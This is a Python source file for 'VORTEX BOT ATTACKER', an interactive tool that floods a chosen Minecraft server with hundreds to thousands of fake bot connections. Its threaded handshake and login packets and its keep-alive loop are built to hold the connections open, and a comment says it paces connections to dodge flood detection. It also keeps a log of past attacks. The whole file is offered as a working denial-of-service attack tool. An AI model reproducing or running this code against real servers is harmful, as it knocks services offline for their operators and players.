#!/usr/bin/env python3
# VORTEX BOT ATTACKER v10.0 - Minecraft Bot Joiner + Flooder
# Multiple bot connections to overwhelm Minecraft server

import socket
import threading
import random
import time
import sys
import os
import json
from datetime import datetime

VERSION = "10.0"

# Colors
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"

LOG_FILE = "bot_attacks.json"
active_bots = 0
bot_lock = threading.Lock()

def clear_screen():
    os.system('clear')

def banner():
    clear_screen()
    print(BOLD + CYAN + r"""
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║    ██╗   ██╗ ██████╗ ██████╗ ████████╗███████╗██╗  ██╗          ║
║    ██║   ██║██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝          ║
║    ██║   ██║██║   ██║██████╔╝   ██║   █████╗   ╚███╔╝           ║
║    ╚██╗ ██╔╝██║   ██║██╔══██╗   ██║   ██╔══╝   ██╔██╗           ║
║     ╚████╔╝ ╚██████╔╝██║  ██║   ██║   ███████╗██╔╝ ██╗          ║
║      ╚═══╝   ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝          ║
║                                                                  ║
║         VORTEX BOT ATTACKER v10.0 - Minecraft                    ║
║         Bot Joiner | Flooder | Mass Connection                  ║
╚══════════════════════════════════════════════════════════════════╝
""" + RESET)
    print(CYAN + f"  [!] Bot Attacker Active | Started: {datetime.now().strftime('%H:%M:%S')}" + RESET)

def save_log(log_data):
    logs = []
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, "r") as f:
                logs = json.load(f)
        except:
            logs = []
    logs.append(log_data)
    if len(logs) > 100:
        logs = logs[-100:]
    with open(LOG_FILE, "w") as f:
        json.dump(logs, f, indent=2)

def resolve_domain(domain):
    try:
        ip = socket.gethostbyname(domain)
        print(GREEN + f"[✓] {domain} → {ip}" + RESET)
        return ip
    except:
        print(RED + f"[✗] Cannot resolve {domain}" + RESET)
        return None

# ============ MINECRAFT BOT CLASS ============

class MinecraftBot:
    def __init__(self, bot_id, server_ip, server_port, bot_name):
        self.bot_id = bot_id
        self.server_ip = server_ip
        self.server_port = server_port
        self.bot_name = bot_name
        self.socket = None
        self.connected = False
    
    def connect(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(5)
            self.socket.connect((self.server_ip, self.server_port))
            self.connected = True
            return True
        except:
            return False
    
    def send_handshake(self):
        try:
            # Minecraft handshake packet
            packet = bytearray()
            packet.append(0x00)  # Packet ID
            
            # Protocol version (random between 754-767)
            protocol = random.choice([754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765])
            # Write VarInt protocol
            while protocol > 0:
                b = protocol & 0x7F
                protocol >>= 7
                if protocol != 0:
                    b |= 0x80
                packet.append(b)
            
            # Server address
            addr_bytes = self.server_ip.encode()
            packet.append(len(addr_bytes))
            packet.extend(addr_bytes)
            
            # Port
            packet.append(self.server_port & 0xFF)
            packet.append((self.server_port >> 8) & 0xFF)
            
            # Next state (2 = login)
            packet.append(2)
            
            self.socket.send(packet)
            return True
        except:
            return False
    
    def send_login(self):
        try:
            # Login start packet
            packet = bytearray()
            packet.append(0x00)  # Packet ID
            
            # Username
            name_bytes = self.bot_name.encode()
            # Write VarInt length
            length = len(name_bytes)
            while length > 0:
                b = length & 0x7F
                length >>= 7
                if length != 0:
                    b |= 0x80
                packet.append(b)
            packet.extend(name_bytes)
            
            self.socket.send(packet)
            return True
        except:
            return False
    
    def keep_alive(self):
        try:
            # Send keep alive packet every 30 seconds
            packet = bytearray()
            packet.append(0x10)  # Keep alive packet ID
            packet.extend(random.getrandbits(64).to_bytes(8, 'big'))
            self.socket.send(packet)
            return True
        except:
            return False
    
    def disconnect(self):
        try:
            if self.socket:
                self.socket.close()
            self.connected = False
        except:
            pass

# ============ BOT MANAGER ============

class BotManager:
    def __init__(self):
        self.bots = []
        self.running = False
        self.stats = {"connected": 0, "failed": 0, "active": 0}
    
    def generate_bot_name(self):
        prefixes = ["Bot", "Player", "User", "Guest", "MC", "Miner", "Craft", "Block", "Diamond", "Steve"]
        suffixes = ["123", "456", "789", "XD", "Pro", "Noob", "OP", "GG", "LOL", "YT"]
        numbers = random.randint(1, 9999)
        
        if random.choice([True, False]):
            return random.choice(prefixes) + str(numbers)
        else:
            return random.choice(prefixes) + random.choice(suffixes) + str(random.randint(1, 99))
    
    def create_bot(self, server_ip, server_port, bot_id):
        bot_name = self.generate_bot_name()
        bot = MinecraftBot(bot_id, server_ip, server_port, bot_name)
        return bot
    
    def run_bot(self, bot, keep_alive_duration):
        try:
            if not bot.connect():
                with bot_lock:
                    self.stats["failed"] += 1
                return
            
            if not bot.send_handshake():
                with bot_lock:
                    self.stats["failed"] += 1
                bot.disconnect()
                return
            
            if not bot.send_login():
                with bot_lock:
                    self.stats["failed"] += 1
                bot.disconnect()
                return
            
            with bot_lock:
                self.stats["connected"] += 1
                self.stats["active"] += 1
            
            # Keep bot alive for specified duration
            start_time = time.time()
            last_keep_alive = start_time
            
            while self.running and (time.time() - start_time) < keep_alive_duration:
                if time.time() - last_keep_alive > 25:
                    bot.keep_alive()
                    last_keep_alive = time.time()
                time.sleep(1)
            
            bot.disconnect()
            with bot_lock:
                self.stats["active"] -= 1
                
        except:
            with bot_lock:
                self.stats["failed"] += 1
                self.stats["active"] -= 1
            bot.disconnect()
    
    def start_attack(self, server_ip, server_port, num_bots, duration):
        self.running = True
        self.bots = []
        self.stats = {"connected": 0, "failed": 0, "active": 0}
        
        print(GREEN + f"\n[🔥] Starting Bot Attack on {server_ip}:{server_port}" + RESET)
        print(CYAN + f"[🤖] Creating {num_bots} bots..." + RESET)
        print(CYAN + f"[⏱️] Bots will stay connected for {duration} seconds" + RESET)
        print("")
        
        # Create and start bot threads
        for i in range(num_bots):
            bot = self.create_bot(server_ip, server_port, i)
            self.bots.append(bot)
            thread = threading.Thread(target=self.run_bot, args=(bot, duration))
            thread.daemon = True
            thread.start()
            
            # Small delay to prevent connection flood detection
            time.sleep(0.05)
        
        # Monitor progress
        start_time = time.time()
        while self.running and (time.time() - start_time) < duration + 10:
            with bot_lock:
                print(f"\r[📊] Connected: {self.stats['connected']} | Active: {self.stats['active']} | Failed: {self.stats['failed']}    ", end="")
            time.sleep(2)
        
        self.running = False
        print("\n")
        print(GREEN + f"[✓] Attack finished!" + RESET)
        print(f"[📊] Total bots connected: {self.stats['connected']}")
        print(f"[⚠️] Failed connections: {self.stats['failed']}")
        
        # Save log
        save_log({
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "target": f"{server_ip}:{server_port}",
            "bots": num_bots,
            "duration": duration,
            "connected": self.stats['connected'],
            "failed": self.stats['failed'],
            "status": "SUCCESS" if self.stats['connected'] > 0 else "FAILED"
        })

# ============ MAIN MENU ============

def main():
    manager = BotManager()
    
    while True:
        clear_screen()
        banner()
        
        print(PURPLE + """
╔═══════════════════════════════════════════════════════════════════════════════╗
║                              BOT ATTACKER MENU                                ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║                                                                               ║
║   ╔═══════════════════════════════════════════════════════════════════════╗  ║
║   ║  1. START BOT ATTACK                                                   ║  ║
║   ║     Connect multiple bots to Minecraft server                          ║  ║
║   ╚═══════════════════════════════════════════════════════════════════════╝  ║
║                                                                               ║
║   ╔═══════════════════════════════════════════════════════════════════════╗  ║
║   ║  2. VIEW ATTACK LOGS                                                   ║  ║
║   ║     See previous bot attacks                                           ║  ║
║   ╚═══════════════════════════════════════════════════════════════════════╝  ║
║                                                                               ║
║   ╔═══════════════════════════════════════════════════════════════════════╗  ║
║   ║  3. CLEAR LOGS                                                        ║  ║
║   ╚═══════════════════════════════════════════════════════════════════════╝  ║
║                                                                               ║
║   ╔═══════════════════════════════════════════════════════════════════════╗  ║
║   ║  4. EXIT                                                              ║  ║
║   ╚═══════════════════════════════════════════════════════════════════════╝  ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
""" + RESET)
        
        choice = input(YELLOW + "Select (1-4): " + RESET)
        
        if choice == "1":
            clear_screen()
            banner()
            print(PURPLE + "\n[ BOT ATTACK CONFIGURATION ]\n" + RESET)
            
            target = input(YELLOW + "Server IP or Domain: " + RESET)
            
            # Resolve domain
            if not target.replace('.', '').isdigit():
                ip = resolve_domain(target)
                if not ip:
                    input("Press Enter...")
                    continue
            else:
                ip = target
            
            port = int(input(YELLOW + "Port (25565 for Java): " + RESET) or 25565)
            num_bots = int(input(YELLOW + "Number of bots (100-5000): " + RESET) or 500)
            duration = int(input(YELLOW + "How long bots stay connected (seconds, 30-300): " + RESET) or 60)
            
            print(RED + "\n" + "="*50)
            print(f"  Target: {ip}:{port}")
            print(f"  Bots: {num_bots}")
            print(f"  Duration: {duration} seconds")
            print("="*50 + RESET)
            
            confirm = input("\nStart bot attack? (y/n): ")
            if confirm.lower() == 'y':
                manager.start_attack(ip, port, num_bots, duration)
                input("\nPress Enter...")
        
        elif choice == "2":
            clear_screen()
            banner()
            print(BLUE + "\n[ ATTACK LOGS ]\n" + RESET)
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, "r") as f:
                    logs = json.load(f)
                if logs:
                    for log in reversed(logs[-20:]):
                        status_color = GREEN if log['status'] == 'SUCCESS' else RED
                        print(f"[{log['timestamp']}] {log['target']} | Bots:{log['bots']} | {status_color}{log['status']}{RESET}")
                else:
                    print("No logs found.")
            else:
                print("No logs found.")
            input("\nPress Enter...")
        
        elif choice == "3":
            if os.path.exists(LOG_FILE):
                os.remove(LOG_FILE)
                print(GREEN + "[✓] Logs cleared" + RESET)
            else:
                print(YELLOW + "[!] No logs to clear" + RESET)
            time.sleep(1)
        
        elif choice == "4":
            print(GREEN + "\n[✓] Exiting Vortex Bot Attacker..." + RESET)
            sys.exit(0)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(YELLOW + "\n\n[!] Exiting..." + RESET)
        sys.exit(0)
